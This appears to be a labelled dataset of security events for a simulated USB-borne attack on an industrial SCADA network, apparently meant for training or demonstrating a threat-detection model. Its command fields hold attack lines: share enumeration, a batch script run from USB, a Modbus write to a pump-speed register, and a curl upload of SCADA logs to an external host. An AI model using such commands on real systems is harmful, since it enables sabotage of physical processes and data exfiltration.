timestamp,event_id,source_type,source_ip,destination_ip,hostname,user,process_name,command_line,destination_port,protocol,event_category,event_name,description,xgboost_prediction,xgboost_confidence,attack_scenario,mitre_tactic,mitre_technique,mitre_id,severity,status
2026-05-02 08:21:10,EVT-011,endpoint_log,10.0.0.5,-,HMI-Operator,mohammed,net.exe,net view \\SCADA-Server,-,-,Discovery,Network Share Discovery,Host enumerated network shares and SCADA server name.,Malicious,0.89,USB Injection,Discovery,Network Share Discovery,T1135,Medium,Suspicious
2026-05-02 08:21:30,EVT-012,network_log,10.0.0.5,10.0.0.10,HMI-Operator,mohammed,maintenance_update.exe,-,445,TCP,Lateral Movement,SMB Connection To SCADA,HMI opened SMB session to SCADA after suspicious execution.,Malicious,0.92,USB Injection,Lateral Movement,Remote Services: SMB/Windows Admin Shares,T1021.002,High,Suspicious
2026-05-02 08:21:55,EVT-013,auth_log,10.0.0.5,10.0.0.10,SCADA-Server,mohammed,-,-,445,TCP,Credential Access,Multiple Authentication Attempts,Failed logins followed by successful authentication to SCADA.,Malicious,0.9,USB Injection,Credential Access,Brute Force,T1110,High,Suspicious
2026-05-02 08:22:20,EVT-014,scada_log,10.0.0.10,10.0.0.20,SCADA-Server,service_scada,-,-,3389,TCP,Lateral Movement,SCADA Session Established,Remote session established toward PLC network segment.,Malicious,0.87,USB Injection,Lateral Movement,Remote Services,T1021,High,Suspicious
2026-05-02 08:22:50,EVT-015,scada_log,10.0.0.10,10.0.0.20,SCADA-Server,service_scada,-,WRITE REGISTER 40012 VALUE 95,502,Modbus/TCP,Impact,PLC Write Command Issued,SCADA sent write command to PLC register controlling pump speed.,Malicious,0.98,USB Injection,Impact,Modify Control Logic,T0831,Critical,Malicious
2026-05-02 08:23:05,EVT-016,plc_log,10.0.0.20,-,PLC-Main,system,-,-,-,-,Impact,Abnormal PLC State,PLC reported unexpected process variable change.,Malicious,0.97,USB Injection,Impact,Manipulation of Control,T0830,Critical,Malicious
2026-05-02 08:23:30,EVT-017,network_log,10.0.0.10,10.0.0.5,SCADA-Server,service_scada,-,-,-,-,Collection,SCADA Log Exported,SCADA logs copied back to HMI workstation.,Malicious,0.84,USB Injection,Collection,Data from Information Repositories,T1213,Medium,Suspicious
2026-05-02 08:24:00,EVT-018,network_log,10.0.0.5,185.199.108.153,HMI-Operator,mohammed,curl.exe,curl -X POST https://external-host/upload scada_logs.zip,443,TCP,Exfiltration,Data Upload To External Host,Compressed archive uploaded from HMI to external endpoint.,Malicious,0.92,USB Injection,Exfiltration,Exfiltration Over Web Service,T1567,High,Malicious
2026-05-02 08:25:00,EVT-019,ir_log,10.0.0.5,-,HMI-Operator,mohammed,-,-,-,-,Containment,Host Isolated,HMI workstation isolated from the network.,Benign,0.94,USB Injection,-,-,-,Info,Contained
2026-05-02 08:25:30,EVT-020,forensic_log,10.0.0.5,-,HMI-Operator,mohammed,-,-,-,-,Forensic Action,Evidence Preserved,Disk image and volatile memory collection started.,Benign,0.96,USB Injection,-,-,-,Info,Evidence Preserved
2026-05-02 08:26:00,EVT-021,forensic_log,10.0.0.5,-,HMI-Operator,mohammed,-,-,-,-,Forensic Action,Report Generated,Investigation report generated with timeline and recommendations.,Benign,0.98,USB Injection,-,-,-,Info,Report Generated
2026-05-02 08:26:20,EVT-022,endpoint_log,10.0.0.6,-,Engineering-WS,engineer1,-,-,-,-,Initial Access,Unauthorized USB Mounted,USB mounted on engineering workstation outside approved window.,Malicious,0.86,USB Injection,Initial Access,Hardware Additions,T1200,Medium,Suspicious
2026-05-02 08:26:35,EVT-023,endpoint_log,10.0.0.6,-,Engineering-WS,engineer1,cmd.exe,cmd.exe /c E:\install.bat,-,-,Execution,Script Launched From USB,Batch script launched from removable media.,Malicious,0.91,USB Injection,Execution,Command and Scripting Interpreter: Windows Command Shell,T1059.003,High,Malicious
2026-05-02 08:27:00,EVT-024,network_log,10.0.0.6,10.0.0.10,Engineering-WS,engineer1,mstsc.exe,mstsc /v:10.0.0.10,3389,TCP,Lateral Movement,RDP Connection Attempt,Engineering workstation attempted RDP connection to SCADA server.,Malicious,0.88,USB Injection,Lateral Movement,Remote Services: Remote Desktop Protocol,T1021.001,High,Suspicious
2026-05-02 08:27:30,EVT-025,scada_log,10.0.0.10,10.0.0.20,SCADA-Server,service_scada,-,-,-,-,Impact,Control Parameter Changed,Control parameter changed without approved maintenance ticket.,Malicious,0.96,USB Injection,Impact,Manipulation of Control,T0830,Critical,Malicious
